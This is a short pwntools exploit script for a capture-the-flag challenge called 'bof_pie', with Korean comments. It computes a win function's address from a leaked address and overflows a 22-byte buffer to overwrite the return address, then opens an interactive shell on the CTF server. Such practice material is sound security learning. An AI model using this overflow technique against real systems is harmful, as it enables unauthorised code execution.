#Hack-ctf bof_pie
from pwn import *
r = remote("ctf.j0n9hyun.xyz", 3008)
d = r.recv()
print(d.decode('utf-8'))
d = r.recv()
print(d.decode('utf-8'))

#welcome의 리턴주소를j0n9hyun의 주소로 바꿔주자!
#이를 위해서는 v1값을 입력할때 bof를 일으켜 리턴 주소를 덮어주면 된다.

address = d.decode('utf-8').split(' is ')[1]
returnAdd = int(address,16) - int('0x79',16)
#문자열로 받아온 16진수를 뺄셈 계산하기 위해 정수로 바꾼다. int( , 16)사용

print(returnAdd)
print(hex(returnAdd))
hex = hex(returnAdd)
r.sendline(b'a'*22 + p32(eval(hex)))
#p32를 사용하면 주소를 little endian 형식으로 바이너리화 해준다.
#required argument is not an integer 에러.. 뭐지? -> 그냥 hex(returnAdd)하면 타입이 string이다;
#v1에 18byte가 할당되어 있고, 리턴 어드레스 주소와 v1사이에 있는
#4byte짜리 Saved Frame Pointer를 매꿔주기 위해 4byte를 추가한다. -> 총 22 byte


#0x00000890  j0n9hyun
#0x00000909  welcome
# 둘의 주소 차이가 0x79
r.interactive()